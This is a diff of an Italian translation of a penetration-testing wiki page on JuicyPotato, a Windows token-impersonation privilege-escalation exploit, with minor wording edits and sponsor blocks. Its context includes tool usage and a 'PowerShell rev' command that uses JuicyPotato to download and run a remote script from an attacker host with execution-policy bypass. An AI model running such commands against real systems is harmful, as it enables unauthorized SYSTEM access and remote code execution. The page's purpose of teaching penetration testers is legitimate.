@@ -12,9 +12,9 @@
 
 </details>
 
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
 [**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark web** che offre funzionalità **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.
 
@@ -52,7 +52,7 @@ Abbiamo deciso di rendere armaiolo [RottenPotatoNG](https://github.com/breenmach
 
 Abbiamo scoperto che, oltre a `BITS`, ci sono diversi server COM che possiamo abusare. Devono solo:
 
-1. essere istanziabili dall'utente corrente, di solito un "utente servizio" che ha privilegi di impersonificazione
+1. essere istanziabili dall'utente corrente, di solito un "utente di servizio" che ha privilegi di impersonificazione
 2. implementare l'interfaccia `IMarshal`
 3. essere eseguiti come utente elevato (SYSTEM, Amministratore, …)
 
@@ -73,7 +73,7 @@ JuicyPotato ti consente di:
 * **Argomento del processo** _personalizza gli argomenti del processo avviato_
 * **Indirizzo del server RPC** _per un approccio stealthy puoi autenticarti a un server RPC esterno_
 * **Porta del server RPC** _utile se vuoi autenticarti a un server esterno e il firewall blocca la porta `135`…_
-* **Modalità TEST** _principalmente per scopi di test, cioè testare i CLSID. Crea il DCOM e stampa l'utente del token. Vedi_ [_qui per il testing_](http://ohpe.it/juicy-potato/Test/)
+* **Modalità TEST** _principalmente per scopi di test, ad es. testare CLSID. Crea il DCOM e stampa l'utente del token. Vedi_ [_qui per il testing_](http://ohpe.it/juicy-potato/Test/)
 ### Utilizzo <a href="#usage" id="usage"></a>
 ```
 T:\>JuicyPotato.exe
@@ -97,9 +97,9 @@ Optional args:
 
 Se l'utente ha i privilegi `SeImpersonate` o `SeAssignPrimaryToken`, allora sei **SYSTEM**.
 
-È quasi impossibile prevenire l'abuso di tutti questi Server COM. Potresti pensare di modificare le autorizzazioni di questi oggetti tramite `DCOMCNFG`, ma buona fortuna, sarà una sfida.
+È quasi impossibile prevenire l'abuso di tutti questi Server COM. Potresti pensare di modificare i permessi di questi oggetti tramite `DCOMCNFG`, ma buona fortuna, sarà una sfida.
 
-La soluzione effettiva è proteggere gli account sensibili e le applicazioni che vengono eseguite con gli account `* SERVICE`. Arrestare `DCOM` certamente inibirà questo exploit ma potrebbe avere un impatto serio sul sistema operativo sottostante.
+La soluzione effettiva è proteggere gli account sensibili e le applicazioni che vengono eseguite con gli account `* SERVICE`. Arrestare `DCOM` certamente ostacolerebbe questo exploit ma potrebbe avere un impatto serio sul sistema operativo sottostante.
 
 Da: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
@@ -120,7 +120,7 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 
 c:\Users\Public>
 ```
-### Powershell rev
+### PowerShell rev
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
@@ -136,7 +136,7 @@ Spesso, il CLSID predefinito che JuicyPotato utilizza **non funziona** e l'explo
 
 ### **Verifica dei CLSID**
 
-Innanzitutto, avrai bisogno di alcuni eseguibili diversi da juicypotato.exe.
+Innanzitutto, avrai bisogno di alcuni file eseguibili diversi da juicypotato.exe.
 
 Scarica [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e caricalo nella tua sessione PS, scarica ed esegui [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Quello script creerà un elenco di possibili CLSID da testare.
 
@@ -148,13 +148,13 @@ Successivamente, scarica [test\_clsid.bat ](https://github.com/ohpe/juicy-potato
 
 * [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
 
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
 [**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark web** che offre funzionalità **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.
 
-Il loro obiettivo principale è contrastare le violazioni degli account e gli attacchi ransomware derivanti da malware che rubano informazioni.
+Il loro obiettivo principale è combattere i takeover di account e gli attacchi ransomware derivanti da malware che rubano informazioni.
 
 Puoi visitare il loro sito web e provare il loro motore **gratuitamente** su:
 
